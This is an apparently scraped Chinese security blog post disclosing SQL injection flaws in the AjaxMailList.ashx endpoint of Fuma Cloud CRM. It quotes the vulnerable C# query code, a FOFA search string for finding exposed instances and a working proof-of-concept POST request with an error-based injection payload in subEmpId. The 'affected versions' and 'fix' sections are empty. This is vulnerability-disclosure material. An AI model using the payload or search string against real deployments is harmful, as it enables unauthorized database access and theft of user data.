---
title: "孚盟云CRM AjaxMailList.ashx 多个SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxMailList-sqli.html
asset_dir: assets/孚盟云crm-ajaxmaillist.ashx-多个sql注入漏洞
---

# 孚盟云CRM AjaxMailList.ashx 多个SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/20 08:31
- 249浏览
- [0评论](#comment)
- 11分钟阅读

深入探索

Nessus

安全研究报告

网络安全课程

---

# 漏洞简介

上海孚盟[软件](#)有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxMailList.ashx接口存在多个[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

深入探索

网络安全会议

云安全解决方案

编程语言教程

直接看 `AjaxMailList.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxMailList** 方法的实现如下

[![孚盟云CRM AjaxMailList.ashx 多个SQL注入漏洞](images/img-001-4a84e0dbac07.webp)](https://image.mrxn.net/d0937d0e98724efeab2d5e1eea1e7566.webp)

当参数subEmpId存在且不为空或null时，会被先带入GetMailTree方法

代码安全审计

深入探索

服务器安全服务

JSON处理工具

安全运维咨询

```
public DataTable GetMailTree(string EmpID)
{
  return this.dbHelper.Query($"SELECT A.*,B.BgColor,B.BoxType,B.Description,B.KeyInID,B.KeyInName,B.KeyInDate,B.LastEditMan,B.LastEditDate,B.AuditState,B.IsDeleted,B.IsSearchFolder,B.SearchType,B.SearchConditionStr,B.SearchConditionSQL,B.IncludeSubMailBoxs,B.SearchMailBoxs,B.SearchVersion FROM vwMailBoxRelation A LEFT JOIN tmMailBox B ON A.FID=B.FID WHERE ( A.OwnerID='{EmpID}' OR A.OwnerID='SERVER' )").Tables[0];
}
```

参数**subEmpId**被直接拼接进SQL语句中执行，期间无过滤或校验，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。其处理逻辑如下

[![孚盟云CRM AjaxMailList.ashx 多个SQL注入漏洞](images/img-002-7582c7da39f3.webp)](https://image.mrxn.net/4aaf00fead334ae3982191f74d5ccb7f.webp)

[![孚盟云CRM AjaxMailList.ashx 多个SQL注入漏洞](images/img-003-b61196926367.webp)](https://image.mrxn.net/131a1c2eba6147fdb3d0febbd61773cc.webp)

[![孚盟云CRM AjaxMailList.ashx 多个SQL注入漏洞](images/img-004-847cedc9796a.webp)](https://image.mrxn.net/2e7b2feb917a44309e48ae70f00340f1.webp)

[![孚盟云CRM AjaxMailList.ashx 多个SQL注入漏洞](images/img-005-198ff414a670.webp)](https://image.mrxn.net/6c580d2e0e17407dae7bd6fa1365dde5.webp)

[![孚盟云CRM AjaxMailList.ashx 多个SQL注入漏洞](images/img-006-920dc3c8f9a0.webp)](https://image.mrxn.net/0a500338b9a041cc839fda3686e5328b.webp)

# 漏洞复现

```
POST /m/Dingding/Ajax/AjaxMailList.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"1"}
Content-Type: application/x-www-form-urlencoded

method=&subEmpId=1')and 1<user--
```

[![孚盟云CRM AjaxMailList.ashx 多个SQL注入漏洞](images/img-007-54b8e15fe768.webp)](https://image.mrxn.net/4a0f1d779caf450f9e5b12f43ec6c082.webp)

成功通过报错注入在响应回显数数据库用户信息

漏洞修复方案

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
